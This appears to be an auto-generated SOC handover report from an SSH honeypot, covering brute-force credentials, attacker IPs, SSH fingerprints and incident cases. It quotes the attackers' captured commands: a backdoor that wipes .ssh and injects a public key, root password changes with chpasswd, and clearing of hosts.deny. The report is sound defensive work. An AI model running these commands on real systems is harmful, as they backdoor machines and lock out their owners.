# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-27 |
| **Generated At** | 2026-04-27T14:03:41Z |
| **Shift Time** | 14:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **176** |
| Confirmed Threats | **149** |
| False Positives Filtered | **27** (15.3%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **18** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **112** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **99** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **6** |
| Unique Passwords | **40** |
| Successful Auth Pairs | **47** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `345gs5662d34` | 30 |
| `root1` | 2 |
| `admin` | 1 |
| `` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 30 |
| `3245gs5662d34` | 30 |
| `1q71bqxx` | 2 |
| `z7895123` | 1 |
| `dinglicom123!@` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 30 |
| `root` | `3245gs5662d34` | 30 |
| `root` | `1q71bqxx` | 2 |
| `root` | `z7895123` | 1 |
| `root` | `dinglicom123!@` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `z7895123` | `27.128.240.75` | 2026-04-27T10:33:25 |
| `root` | `3245gs5662d34` | `27.128.240.75` | 2026-04-27T10:33:29 |
| `root` | `dinglicom123!@` | `42.51.40.180` | 2026-04-27T10:34:00 |
| `root` | `P@55word` | `20.153.204.5` | 2026-04-27T10:35:46 |
| `root` | `3245gs5662d34` | `20.153.204.5` | 2026-04-27T10:36:02 |
| `root` | `Asdfgh123` | `42.51.40.180` | 2026-04-27T10:39:38 |
| `root` | `wayoflife11` | `42.51.40.180` | 2026-04-27T10:48:21 |
| `root` | `p@ss` | `167.86.108.126` | 2026-04-27T11:41:21 |
| `root` | `3245gs5662d34` | `167.86.108.126` | 2026-04-27T11:41:24 |
| `root` | `zxcvasdfqwer1234` | `70.114.116.180` | 2026-04-27T11:46:22 |
| `root` | `3245gs5662d34` | `70.114.116.180` | 2026-04-27T11:46:28 |
| `root` | `MmJlZDU2NWIzYzAx` | `43.134.187.172` | 2026-04-27T11:47:49 |
| `root` | `3245gs5662d34` | `43.134.187.172` | 2026-04-27T11:47:52 |
| `root` | `1q71bqxx` | `121.134.60.125` | 2026-04-27T11:58:03 |
| `root` | `123!@QWEqwe` | `102.88.137.213` | 2026-04-27T12:10:49 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-04-27T12:10:56 |
| `root` | `Dragon` | `102.88.137.213` | 2026-04-27T12:12:58 |
| `root` | `1qw23er4` | `102.88.137.213` | 2026-04-27T12:14:03 |
| `root` | `!@12QWaszx` | `102.88.137.213` | 2026-04-27T12:15:06 |
| `root` | `P@$$word2024` | `102.88.137.213` | 2026-04-27T12:16:11 |
| `root` | `Password.2` | `102.88.137.213` | 2026-04-27T12:17:18 |
| `root` | `sa_cluster` | `102.88.137.213` | 2026-04-27T12:18:24 |
| `root` | `Aa123..` | `102.88.137.213` | 2026-04-27T12:19:28 |
| `root` | `p@55w0rd123` | `102.88.137.213` | 2026-04-27T12:20:31 |
| `root` | `The0ne419` | `102.88.137.213` | 2026-04-27T12:21:33 |
| `root` | `root2025#` | `102.88.137.213` | 2026-04-27T12:22:40 |
| `root` | `1q71bqxx` | `102.88.137.213` | 2026-04-27T12:23:51 |
| `root` | `changeme01` | `102.88.137.213` | 2026-04-27T12:24:58 |
| `root` | `123456@a` | `102.88.137.213` | 2026-04-27T12:26:03 |
| `root` | `gmaj` | `102.88.137.213` | 2026-04-27T12:27:07 |
| `root` | `1111111111111` | `102.88.137.213` | 2026-04-27T12:28:14 |
| `root` | `xinnet` | `102.88.137.213` | 2026-04-27T12:29:19 |
| `root` | `adminleo` | `102.88.137.213` | 2026-04-27T12:30:27 |
| `root` | `1234qwer@` | `201.144.57.229` | 2026-04-27T12:47:13 |
| `root` | `3245gs5662d34` | `201.144.57.229` | 2026-04-27T12:47:20 |
| `root` | `!!changeme$$` | `103.186.139.149` | 2026-04-27T13:48:32 |
| `root` | `3245gs5662d34` | `103.186.139.149` | 2026-04-27T13:48:41 |
| `root` | `kai123456` | `101.36.124.127` | 2026-04-27T13:48:54 |
| `root` | `3245gs5662d34` | `101.36.124.127` | 2026-04-27T13:48:57 |
| `root` | `ngf1r3wall` | `152.250.243.47` | 2026-04-27T13:49:19 |
| `root` | `3245gs5662d34` | `152.250.243.47` | 2026-04-27T13:49:26 |
| `root` | `Xjgl@20250820@Fpool` | `179.32.33.161` | 2026-04-27T13:51:21 |
| `root` | `3245gs5662d34` | `179.32.33.161` | 2026-04-27T13:51:28 |
| `root` | `3.1415926` | `165.154.36.71` | 2026-04-27T13:52:33 |
| `root` | `3245gs5662d34` | `165.154.36.71` | 2026-04-27T13:52:39 |
| `root` | `qweasdz` | `152.32.163.183` | 2026-04-27T14:01:09 |
| `root` | `3245gs5662d34` | `152.32.163.183` | 2026-04-27T14:01:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **176** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 119 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 115 | 14 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 115 | 14 | libssh-based |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 14 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:JtjSuox8CQrR"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `42.51.40.180`, `121.134.60.125`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:XbCRbFp0JRnS"|chpasswd|bash
```
Source IPs: `42.51.40.180`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `165.154.36.71`, `179.32.33.161`, `102.88.137.213`, `70.114.116.180`, `43.134.187.172`, `101.36.124.127`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **27** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS11664` | Techtel LMDS Comunicaciones Interactivas S.A. | 1 | HIGH |
| `AS131353` | NhanHoa Software company | 1 | HIGH |
| `AS11427` | Charter Communications Inc | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-663576736042

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-27 10:33 |
| **Last Seen** | 2026-04-27 10:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:33:25` | `cowrie.session.connect` |
| `2026-04-27 10:33:25` | `cowrie.client.version` |
| `2026-04-27 10:33:25` | `cowrie.client.kex` |
| `2026-04-27 10:33:25` | `cowrie.login.success` |
| `2026-04-27 10:33:26` | `cowrie.session.params` |
| `2026-04-27 10:33:26` | `cowrie.command.input` |
| `2026-04-27 10:33:26` | `cowrie.command.failed` |
| `2026-04-27 10:33:26` | `cowrie.log.closed` |
| `2026-04-27 10:33:26` | `cowrie.session.params` |
| `2026-04-27 10:33:26` | `cowrie.command.input` |
| `2026-04-27 10:33:26` | `cowrie.session.file_download` |
| `2026-04-27 10:33:26` | `cowrie.log.closed` |
| `2026-04-27 10:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e7165eeb60

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-27 10:33 |
| **Last Seen** | 2026-04-27 10:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:33:29` | `cowrie.session.connect` |
| `2026-04-27 10:33:29` | `cowrie.client.version` |
| `2026-04-27 10:33:29` | `cowrie.client.kex` |
| `2026-04-27 10:33:29` | `cowrie.login.success` |
| `2026-04-27 10:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6d8da28bd32

| Field | Detail |
|---|---|
| **Source IP** | `42.51.40[.]180` |
| **First Seen** | 2026-04-27 10:33 |
| **Last Seen** | 2026-04-27 10:34 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:JtjSuox8CQrR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:33:59` | `cowrie.session.connect` |
| `2026-04-27 10:33:59` | `cowrie.client.version` |
| `2026-04-27 10:33:59` | `cowrie.client.kex` |
| `2026-04-27 10:34:00` | `cowrie.login.success` |
| `2026-04-27 10:34:00` | `cowrie.session.params` |
| `2026-04-27 10:34:00` | `cowrie.command.input` |
| `2026-04-27 10:34:00` | `cowrie.command.failed` |
| `2026-04-27 10:34:00` | `cowrie.log.closed` |
| `2026-04-27 10:34:00` | `cowrie.session.params` |
| `2026-04-27 10:34:00` | `cowrie.command.input` |
| `2026-04-27 10:34:01` | `cowrie.session.file_download` |
| `2026-04-27 10:34:01` | `cowrie.log.closed` |
| `2026-04-27 10:34:13` | `cowrie.session.params` |
| `2026-04-27 10:34:13` | `cowrie.command.input` |
| `2026-04-27 10:34:13` | `cowrie.log.closed` |
| `2026-04-27 10:34:13` | `cowrie.session.params` |
| `2026-04-27 10:34:13` | `cowrie.command.input` |
| `2026-04-27 10:34:13` | `cowrie.log.closed` |
| `2026-04-27 10:34:14` | `cowrie.session.params` |
| `2026-04-27 10:34:14` | `cowrie.command.input` |
| `2026-04-27 10:34:14` | `cowrie.session.file_download` |
| `2026-04-27 10:34:14` | `cowrie.log.closed` |
| `2026-04-27 10:34:14` | `cowrie.session.params` |
| `2026-04-27 10:34:14` | `cowrie.command.input` |
| `2026-04-27 10:34:14` | `cowrie.log.closed` |
| `2026-04-27 10:34:15` | `cowrie.session.params` |
| `2026-04-27 10:34:15` | `cowrie.command.input` |
| `2026-04-27 10:34:15` | `cowrie.log.closed` |
| `2026-04-27 10:34:15` | `cowrie.session.params` |
| `2026-04-27 10:34:15` | `cowrie.command.input` |
| `2026-04-27 10:34:15` | `cowrie.command.input` |
| `2026-04-27 10:34:15` | `cowrie.log.closed` |
| `2026-04-27 10:34:16` | `cowrie.session.params` |
| `2026-04-27 10:34:16` | `cowrie.command.input` |
| `2026-04-27 10:34:16` | `cowrie.log.closed` |
| `2026-04-27 10:34:16` | `cowrie.session.params` |
| `2026-04-27 10:34:16` | `cowrie.command.input` |
| `2026-04-27 10:34:16` | `cowrie.log.closed` |
| `2026-04-27 10:34:17` | `cowrie.session.params` |
| `2026-04-27 10:34:17` | `cowrie.command.input` |
| `2026-04-27 10:34:17` | `cowrie.log.closed` |
| `2026-04-27 10:34:17` | `cowrie.session.params` |
| `2026-04-27 10:34:17` | `cowrie.command.input` |
| `2026-04-27 10:34:17` | `cowrie.log.closed` |
| `2026-04-27 10:34:18` | `cowrie.session.params` |
| `2026-04-27 10:34:18` | `cowrie.command.input` |
| `2026-04-27 10:34:18` | `cowrie.log.closed` |
| `2026-04-27 10:34:18` | `cowrie.session.params` |
| `2026-04-27 10:34:18` | `cowrie.command.input` |
| `2026-04-27 10:34:18` | `cowrie.log.closed` |
| `2026-04-27 10:34:19` | `cowrie.session.params` |
| `2026-04-27 10:34:19` | `cowrie.command.input` |
| `2026-04-27 10:34:19` | `cowrie.log.closed` |
| `2026-04-27 10:34:19` | `cowrie.session.params` |
| `2026-04-27 10:34:19` | `cowrie.command.input` |
| `2026-04-27 10:34:19` | `cowrie.log.closed` |
| `2026-04-27 10:34:20` | `cowrie.session.params` |
| `2026-04-27 10:34:20` | `cowrie.command.input` |
| `2026-04-27 10:34:20` | `cowrie.log.closed` |
| `2026-04-27 10:34:20` | `cowrie.session.params` |
| `2026-04-27 10:34:20` | `cowrie.command.input` |
| `2026-04-27 10:34:20` | `cowrie.log.closed` |
| `2026-04-27 10:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.40[.]180` to AbuseIPDB if not already reported
- [ ] Block `42.51.40[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f32b7e1fa6a1

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-27 10:35 |
| **Last Seen** | 2026-04-27 10:36 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:35:43` | `cowrie.session.connect` |
| `2026-04-27 10:35:44` | `cowrie.client.version` |
| `2026-04-27 10:35:45` | `cowrie.client.kex` |
| `2026-04-27 10:35:46` | `cowrie.login.success` |
| `2026-04-27 10:35:49` | `cowrie.session.params` |
| `2026-04-27 10:35:49` | `cowrie.command.input` |
| `2026-04-27 10:35:49` | `cowrie.command.failed` |
| `2026-04-27 10:35:50` | `cowrie.log.closed` |
| `2026-04-27 10:35:50` | `cowrie.session.params` |
| `2026-04-27 10:35:50` | `cowrie.command.input` |
| `2026-04-27 10:35:51` | `cowrie.session.file_download` |
| `2026-04-27 10:35:51` | `cowrie.log.closed` |
| `2026-04-27 10:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9448f12b1c4a

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-04-27 10:36 |
| **Last Seen** | 2026-04-27 10:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:36:01` | `cowrie.session.connect` |
| `2026-04-27 10:36:01` | `cowrie.client.version` |
| `2026-04-27 10:36:01` | `cowrie.client.kex` |
| `2026-04-27 10:36:02` | `cowrie.login.success` |
| `2026-04-27 10:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2ecd9a4166

| Field | Detail |
|---|---|
| **Source IP** | `42.51.40[.]180` |
| **First Seen** | 2026-04-27 10:39 |
| **Last Seen** | 2026-04-27 10:42 |
| **Session Duration** | 193s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XbCRbFp0JRnS"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:39:37` | `cowrie.session.connect` |
| `2026-04-27 10:39:37` | `cowrie.client.version` |
| `2026-04-27 10:39:37` | `cowrie.client.kex` |
| `2026-04-27 10:39:38` | `cowrie.login.success` |
| `2026-04-27 10:39:38` | `cowrie.session.params` |
| `2026-04-27 10:39:38` | `cowrie.command.input` |
| `2026-04-27 10:39:38` | `cowrie.command.failed` |
| `2026-04-27 10:39:39` | `cowrie.log.closed` |
| `2026-04-27 10:39:39` | `cowrie.session.params` |
| `2026-04-27 10:39:39` | `cowrie.command.input` |
| `2026-04-27 10:39:39` | `cowrie.session.file_download` |
| `2026-04-27 10:39:39` | `cowrie.log.closed` |
| `2026-04-27 10:39:47` | `cowrie.session.params` |
| `2026-04-27 10:39:47` | `cowrie.command.input` |
| `2026-04-27 10:39:47` | `cowrie.log.closed` |
| `2026-04-27 10:39:48` | `cowrie.session.params` |
| `2026-04-27 10:39:48` | `cowrie.command.input` |
| `2026-04-27 10:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.40[.]180` to AbuseIPDB if not already reported
- [ ] Block `42.51.40[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7de7e30eb86

| Field | Detail |
|---|---|
| **Source IP** | `42.51.40[.]180` |
| **First Seen** | 2026-04-27 10:48 |
| **Last Seen** | 2026-04-27 10:53 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 10:48:17` | `cowrie.session.connect` |
| `2026-04-27 10:48:17` | `cowrie.client.version` |
| `2026-04-27 10:48:17` | `cowrie.client.kex` |
| `2026-04-27 10:48:21` | `cowrie.login.success` |
| `2026-04-27 10:48:22` | `cowrie.session.params` |
| `2026-04-27 10:48:22` | `cowrie.command.input` |
| `2026-04-27 10:48:22` | `cowrie.command.failed` |
